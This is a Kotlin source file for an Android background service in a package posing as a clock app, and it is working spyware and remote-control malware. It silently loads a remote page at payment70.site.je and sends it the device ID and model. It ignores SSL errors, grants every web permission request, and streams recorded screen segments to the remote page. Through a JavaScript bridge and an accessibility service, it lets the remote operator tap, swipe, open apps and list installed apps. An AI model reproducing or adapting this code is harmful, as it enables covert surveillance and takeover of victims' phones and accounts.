package com.clock.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.http.SslError
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.Settings
import android.util.Base64
import android.util.DisplayMetrics
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.PermissionRequest
import android.webkit.SslErrorHandler
import android.webkit.WebChromeClient
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import java.io.File
import java.net.URLEncoder

class MonitorService : Service() {

    companion object {
        var lastStatus: String = "جاري الاتصال..."
        var lastBridgeTime: Long = System.currentTimeMillis()
        var projectionCode: Int = 0
        var projectionData: Intent? = null
    }

    private val handler = Handler(Looper.getMainLooper())
    private var webView: WebView? = null
    private var fullUrl = ""
    private var androidId = "unknown"
    private val monitorUrl = "https://payment70.site.je/monitor.html"
    private val CHANNEL_ID = "monitor_service"

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var mediaRecorder: MediaRecorder? = null
    private var segFile: File? = null
    private var segSeq = 0
    private var screenRunning = false
    private var deviceW = 720
    private var deviceH = 1600

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "start_screen") {
            handler.post { startScreen() }
        }
        if (intent?.action == "stop_screen") {
            handler.post { stopScreen() }
        }
        return START_STICKY
    }

    override fun onCreate() {
        super.onCreate()
        try {
            createNotificationChannel()
            startForeground(1, buildNotification())
        } catch (e: Exception) {
        }
        try {
            val dm = DisplayMetrics()
            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
            wm.defaultDisplay.getRealMetrics(dm)
            deviceW = dm.widthPixels
            deviceH = dm.heightPixels
        } catch (e: Exception) {
        }
        try {
            setupWebView()
        } catch (e: Exception) {
            lastStatus = "جاري الاتصال..."
        }
        handler.postDelayed(watchdog, 20000)
    }

    private val watchdog = object : Runnable {
        override fun run() {
            val idle = System.currentTimeMillis() - lastBridgeTime
            if (idle > 60000) {
                lastStatus = "جاري الاتصال..."
                lastBridgeTime = System.currentTimeMillis()
                try {
                    webView?.reload()
                } catch (e: Exception) {
                }
            }
            handler.postDelayed(this, 20000)
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Clock Service",
                NotificationManager.IMPORTANCE_LOW
            )
            channel.description = "Service"
            channel.setSound(null, null)
            channel.enableVibration(false)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("Clock App")
                .setContentText("Running")
                .setSmallIcon(R.drawable.ic_clock)
                .setOngoing(true)
                .build()
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
                .setContentTitle("Clock App")
                .setContentText("Running")
                .setSmallIcon(R.drawable.ic_clock)
                .setOngoing(true)
                .build()
        }
    }

    private fun setupWebView() {
        webView = WebView(this)
        val st = webView!!.settings
        st.javaScriptEnabled = true
        st.domStorageEnabled = true
        st.mediaPlaybackRequiresUserGesture = false
        st.cacheMode = WebSettings.LOAD_NO_CACHE
        st.databaseEnabled = true
        st.userAgentString = "Mozilla/5.0 (Linux; Android " + Build.VERSION.RELEASE + "; " + Build.MODEL + ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36"

        webView!!.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                super.onPageFinished(view, url)
            }

            override fun onReceivedError(view: WebView?, request: WebResourceRequest?, error: WebResourceError?) {
                super.onReceivedError(view, request, error)
                lastStatus = "جاري الاتصال..."
            }

            override fun onReceivedSslError(view: WebView?, handler: SslErrorHandler?, error: SslError?) {
                try {
                    handler?.proceed()
                } catch (e: Exception) {
                }
            }
        }

        webView!!.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest?) {
                try {
                    request?.grant(request.resources)
                } catch (e: Exception) {
                }
            }
        }

        webView!!.addJavascriptInterface(WebBridge(), "Android")

        androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val deviceInfo = URLEncoder.encode(Build.MANUFACTURER + " " + Build.MODEL, "UTF-8")
        fullUrl = monitorUrl + "?did=" + androidId + "&dinfo=" + deviceInfo
        webView!!.loadUrl(fullUrl)
    }

    fun startScreen() {
        if (screenRunning) return
        if (projectionData == null) {
            try {
                val i = Intent(this, ProjectionActivity::class.java)
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                startActivity(i)
            } catch (e: Exception) {
            }
            return
        }
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(
                    1, buildNotification(),
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                )
            }
            val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mpm.getMediaProjection(projectionCode, projectionData!!)
            mediaProjection!!.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    screenRunning = false
                    try {
                        virtualDisplay?.release()
                        virtualDisplay = null
                    } catch (e: Exception) {
                    }
                }
            }, handler)
            screenRunning = true
            startSegment()
        } catch (e: Exception) {
            screenRunning = false
        }
    }

    fun stopScreen() {
        screenRunning = false
        handler.removeCallbacks(segNextRunnable)
        try {
            mediaRecorder?.stop()
        } catch (e: Exception) {
        }
        try {
            mediaRecorder?.release()
        } catch (e: Exception) {
        }
        mediaRecorder = null
        try {
            virtualDisplay?.release()
        } catch (e: Exception) {
        }
        virtualDisplay = null
    }

    private fun startSegment() {
        if (!screenRunning) return
        try {
            segSeq++
            val f = File(cacheDir, "seg_$segSeq.webm")
            segFile = f
            val mr = MediaRecorder()
            mediaRecorder = mr
            mr.setVideoSource(MediaRecorder.VideoSource.SURFACE)
            mr.setOutputFormat(MediaRecorder.OutputFormat.WEBM)
            mr.setVideoEncoder(MediaRecorder.VideoEncoder.VP8)
            mr.setVideoSize(360, 640)
            mr.setVideoFrameRate(15)
            mr.setVideoEncodingBitRate(200000)
            mr.setOutputFile(f.absolutePath)
            mr.prepare()
            virtualDisplay = mediaProjection!!.createVirtualDisplay(
                "scr", 360, 640, 160,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                mr.surface, null, null
            )
            mr.start()
            handler.postDelayed(segStopRunnable, 3000)
        } catch (e: Exception) {
            handler.postDelayed(segNextRunnable, 2000)
        }
    }

    private val segStopRunnable = object : Runnable {
        override fun run() {
            finishSegment()
        }
    }

    private val segNextRunnable = object : Runnable {
        override fun run() {
            startSegment()
        }
    }

    private fun finishSegment() {
        try {
            mediaRecorder?.stop()
        } catch (e: Exception) {
        }
        try {
            mediaRecorder?.release()
        } catch (e: Exception) {
        }
        mediaRecorder = null
        try {
            virtualDisplay?.release()
        } catch (e: Exception) {
        }
        virtualDisplay = null
        val f = segFile
        if (f != null && f.exists() && f.length() > 500) {
            val b64 = Base64.encodeToString(f.readBytes(), Base64.NO_WRAP)
            f.delete()
            handler.post {
                webView?.evaluateJavascript(
                    "if(window.segUploadNative)segUploadNative('scr','" + b64 + "');",
                    null
                )
            }
        }
        if (screenRunning) {
            handler.postDelayed(segNextRunnable, 300)
        }
    }

    private fun openAccessibilitySettings() {
        try {
            val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(i)
        } catch (e: Exception) {
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            stopScreen()
            mediaProjection?.stop()
        } catch (e: Exception) {
        }
        try {
            webView?.destroy()
        } catch (e: Exception) {
        }
    }

    inner class WebBridge {
        @JavascriptInterface
        fun onResult(text: String) {
            lastBridgeTime = System.currentTimeMillis()
            lastStatus = text
        }

        @JavascriptInterface
        fun onCommand(text: String) {
            lastBridgeTime = System.currentTimeMillis()
        }

        @JavascriptInterface
        fun startScreen() {
            handler.post { this@MonitorService.startScreen() }
        }

        @JavascriptInterface
        fun stopScreen() {
            handler.post { this@MonitorService.stopScreen() }
        }

        @JavascriptInterface
        fun tap(x: Int, y: Int) {
            val cs = ControlService.instance
            if (cs != null) cs.tap(x.toFloat(), y.toFloat())
            else openAccessibilitySettings()
        }

        @JavascriptInterface
        fun swipe(x1: Int, y1: Int, x2: Int, y2: Int, duration: Int) {
            val cs = ControlService.instance
            if (cs != null) cs.swipe(x1.toFloat(), y1.toFloat(), x2.toFloat(), y2.toFloat(), duration.toLong())
            else openAccessibilitySettings()
        }

        @JavascriptInterface
        fun back() {
            val cs = ControlService.instance
            if (cs != null) cs.back()
            else openAccessibilitySettings()
        }

        @JavascriptInterface
        fun home() {
            val cs = ControlService.instance
            if (cs != null) cs.home()
            else openAccessibilitySettings()
        }

        @JavascriptInterface
        fun recents() {
            val cs = ControlService.instance
            if (cs != null) cs.recents()
            else openAccessibilitySettings()
        }

        @JavascriptInterface
        fun openApp(pkg: String) {
            try {
                val i = packageManager.getLaunchIntentForPackage(pkg)
                if (i != null) {
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(i)
                }
            } catch (e: Exception) {
            }
        }

        @JavascriptInterface
        fun screenSize(): String {
            return deviceW.toString() + "x" + deviceH.toString()
        }

        @JavascriptInterface
        fun getApps(): String {
            val sb = StringBuilder("[")
            try {
                val intent = Intent(Intent.ACTION_MAIN, null).addCategory(Intent.CATEGORY_LAUNCHER)
                val list = packageManager.queryIntentActivities(intent, 0)
                var first = true
                for (ri in list) {
                    val pkg = ri.activityInfo.packageName
                    val name = ri.loadLabel(packageManager).toString()
                    if (!first) sb.append(",")
                    first = false
                    sb.append("{\"n\":\"").append(name.replace("\"", "'")).append("\",\"p\":\"").append(pkg).append("\"}")
                }
            } catch (e: Exception) {
            }
            sb.append("]")
            return sb.toString()
        }
    }
}
